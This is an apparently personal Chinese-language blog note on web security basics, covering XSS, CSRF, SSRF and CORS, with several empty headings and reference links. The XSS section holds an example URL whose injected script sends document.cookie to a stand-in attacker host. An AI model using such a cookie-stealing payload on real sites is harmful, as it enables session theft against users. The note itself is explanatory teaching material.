---
title: "網頁安全筆記"
date: 2019-09-02T05:44:11.000Z
summary:
---

## XSS

- Cross-site scripting
- 利用動態產生內容（ex. 輸入欄位）的網頁漏洞，注入惡意腳本的攻擊手法
- 例如使用短網址包覆帶有惡意腳本的網址：
  `http://app.com/?name=?<script>...attack.com/bad.php?data=document.cookie;</script>`
- 攻擊者便可取得使用者的 Cookie，並藉此盜用相關資料
- 可以針對特殊文字進行處理 (例如 `<`、`&`) 防止攻擊。

## CSRF

- Cross-site request forgery（跨站請求偽造）
- 利用網頁應用本身的漏洞，進行原定以外處理的攻擊手法
- 例如使用短網指包覆指定行為的網址：`http://app.com/post/`
- 導致使用者身份被盜用，從而進行非原定的行為，例如留下犯罪宣言的訊息
- 可以在 request 裡加入 token 驗證這個行為是否真的來自該使用者
- [これで完璧！今さら振り返る CSRF 対策と同一オリジンポリシーの基礎](https://qiita.com/mpyw/items/0595f07736cfa5b1f50c)

## XSS 和 CSRF 的差異

| 觀點     | XSS                           | CSRF                       |
| -------- | ----------------------------- | -------------------------- |
| 漏洞     | 網頁應用程式                  | 網頁應用程式               |
| 執行機制 | 造訪有問題的網址              | 造訪有問題的網址           |
| 執行源頭 | 網頁瀏覽器 (Client)           | 網頁伺服器 (Server)        |
| 執行內容 | JavaScript 所能執行的任意內容 | 網頁應用程式內所定義的處理 |
| 執行前提 | 無                            | 受害者需先登入網頁應用程式 |

## SQL Injection

## ClickJacking

## Open Redirect

## DOS

## Insecure Direct Object Reference Vulnerability

## JSON Hijacking

- [Json Hijacking 簡介 « 關於網路那些事...](https://adon988.logdown.com/posts/7820118-introduction-to-json-hijacking)

## SSRF

- Server-side request forgery
- 利用公開網路與內部網路溝通的漏洞，進行繞過權限認證的攻擊方式

## [同源政策（Same-Origin Policy）](https://developer.mozilla.org/zh-TW/docs/Web/Security/Same-origin_policy)

### 什麼是 CORS（Cross-Origin Resource Sharing，跨來源資源共用）？

### 解決方案

#### 從 API 後端開放權限

#### CORS-anywhere

```javascript
// use cors-anywhere to fetch api data
const cors = "https://cors-anywhere.herokuapp.com/";
// origin api url
const url = "https://tw.rter.info/capi.php?=1568944322585";

// fetch api url by cors-anywhere
axios.get(`${cors}${url}`).then(
  (response) => {
    const msg = response.data;
    document.body.innerHTML = JSON.stringify(msg);
  },
  (error) => {}
);
```

### 參考文章

- [\[教學\] CORS 是什麼? 如何設定 CORS? | Shubo’s Notes](https://shubo.io/what-is-cors/)
- [輕鬆理解 Ajax 與跨來源請求](https://blog.techbridge.cc/2017/05/20/api-ajax-cors-and-jsonp/)
- [原來 CORS 沒有我想像中的簡單](https://blog.techbridge.cc/2018/08/18/cors-issue/)
- [和 CORS 跟 cookie 打交道](https://medium.com/d-d-mag/%E5%92%8C-cors-%E8%B7%9F-cookie-%E6%89%93%E4%BA%A4%E9%81%93-dd420ccc7399)
- [新的取消請求方式 - AbortController | 半熟前端](https://blog.kalan.dev/abort-controller/)
- [这波跨域不亏 · Issue #9 · xixigiggling/my-ice-cream](https://github.com/xixigiggling/my-ice-cream/issues/9)

## 相關文章

- [安全な Web サイトのつくりかた　ざっくりまとめ part1](https://qiita.com/E-46/items/93199f38bdacd6b6076a)
- [安全な Web サイトのつくりかた　ざっくりまとめ part2](https://qiita.com/E-46/items/aa43b6a01de8ab205591)
- [個人開発でも最低限やっておくべきインフラレベルでのセキュリティ対策](https://qiita.com/uichi/items/c34536b66101e9440cf2)
- [Web セキュリティ覚書 : "HTTPS" 編 [ 初学者向け ]](https://qiita.com/Tsutou/items/cea87dbab0f3d0080422)
- [Web セキュリティ覚書 : "攻撃" 編 [ 初学者向け ]](https://qiita.com/Tsutou/items/4fd498f8ab2638bd5650)
- [Same Origin Policy 同源政策 ! 一切安全的基礎](https://medium.com/@jaydenlin/same-origin-policy-%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96-%E4%B8%80%E5%88%87%E5%AE%89%E5%85%A8%E7%9A%84%E5%9F%BA%E7%A4%8E-36432565a226)
- [3 分でわかる XSS と CSRF の違い](https://qiita.com/wanko5296/items/142b5b82485b0196a2da)
- [SSRF 基礎 - Speaker Deck](https://speakerdeck.com/hasegawayosuke/ssrfji-chu)
- [URL の取り扱いには要注意！ SSRF の攻撃と対策 | yamory Blog](https://yamory.io/blog/about-ssrf/)
